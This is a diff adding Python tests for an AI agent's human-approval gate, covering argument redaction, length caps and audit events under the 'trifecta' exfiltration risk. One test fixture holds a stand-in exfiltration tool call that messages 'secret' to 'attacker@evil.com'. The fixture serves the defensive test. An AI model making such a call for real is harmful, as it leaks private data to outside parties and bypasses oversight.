@@ -21,7 +21,13 @@ from arctrust.policy import (
 from arctrust.signer import InProcessSigner
 from nacl.signing import SigningKey
 
-from arcagent.tools.human_gate import ApprovalRequest, HumanGate, HumanGateConfig
+from arcagent.tools.human_gate import (
+    ApprovalRequest,
+    HumanGate,
+    HumanGateConfig,
+    redact_arguments,
+    summarize_arguments,
+)
 
 _TRIFECTA = frozenset({"private_data", "external_comms", "untrusted_input"})
 
@@ -214,3 +220,86 @@ def test_policy_context_carries_session_capabilities() -> None:
     # The injected accumulator field exists and is optional (backward-compatible).
     ctx = PolicyContext(tier="personal", policy_version="v0", bundle_age_seconds=0.0)
     assert ctx.session_capabilities is None
+
+
+class TestArgumentRedaction:
+    """SPEC-035 approval enrichment — arguments are redacted + length-bounded."""
+
+    def test_secrets_and_pii_are_redacted(self) -> None:
+        preview = redact_arguments(
+            {"to": "victim@example.com", "body": "my ssn is 123-45-6789"}
+        )
+        assert "victim@example.com" not in preview["to"]
+        assert "123-45-6789" not in preview["body"]
+
+    def test_values_are_length_bounded(self) -> None:
+        preview = redact_arguments({"body": "A" * 5000})
+        assert len(preview["body"]) <= 130  # cap (120) + ellipsis
+        assert preview["body"].endswith("...")
+
+    def test_summary_is_bounded_one_line(self) -> None:
+        summary = summarize_arguments({"a": "x" * 500, "b": "y" * 500})
+        assert len(summary) <= 200
+        assert "\n" not in summary
+
+
+@pytest.mark.asyncio
+class TestApprovalRequestEnrichment:
+    """The gate threads arguments (redacted), provenance, and session_id through."""
+
+    async def test_request_carries_enriched_fields_into_channel(self) -> None:
+        captured: dict[str, ApprovalRequest] = {}
+
+        async def capture(req: ApprovalRequest) -> ApprovalGrant | None:
+            captured["req"] = req
+            return None
+
+        agent_did = "did:arc:example:org:agent:abc"
+        call = ToolCall(
+            tool_name="messaging_send",
+            arguments={"to": "attacker@evil.com", "body": "secret"},
+            agent_did=agent_did,
+            session_id="sess-42",
+            classification="unclassified",
+            capability_tags=frozenset({"external_comms"}),
+        )
+        gate = HumanGate(
+            operator_signer=_operator_signer(),
+            agent_did=agent_did,
+            tier="enterprise",
+            channel=capture,
+        )
+        provenance = [{"legs": ["private_data"], "tool": "file_read", "args": "path=/x", "at": "t"}]
+        await gate.request(call, legs=_TRIFECTA, provenance=provenance)
+
+        req = captured["req"]
+        assert req.session_id == "sess-42"
+        assert req.leg_provenance == provenance
+        assert "attacker@evil.com" not in req.arguments["to"]  # redacted
+        assert set(req.arguments) == {"to", "body"}
+
+    async def test_emit_payload_includes_enriched_fields(self) -> None:
+        events: list[tuple[str, dict[str, object]]] = []
+
+        gate = HumanGate(
+            operator_signer=_operator_signer(),
+            agent_did="did:arc:example:org:agent:abc",
+            tier="federal",
+            audit_sink=lambda event, payload: events.append((event, payload)),
+        )
+        call = ToolCall(
+            tool_name="egress",
+            arguments={"url": "https://x"},
+            agent_did="did:arc:example:org:agent:abc",
+            session_id="sess-7",
+            classification="unclassified",
+            capability_tags=frozenset({"external_comms"}),
+        )
+        # No channel + federal → fail closed, but an audit event still emits.
+        await gate.request(call, legs=_TRIFECTA, provenance=[{"tool": "file_read"}])
+
+        assert events, "an audit event must be emitted"
+        _, payload = events[0]
+        assert payload["session_id"] == "sess-7"
+        assert payload["arguments"] == {"url": "https://x"}
+        assert payload["leg_provenance"] == [{"tool": "file_read"}]
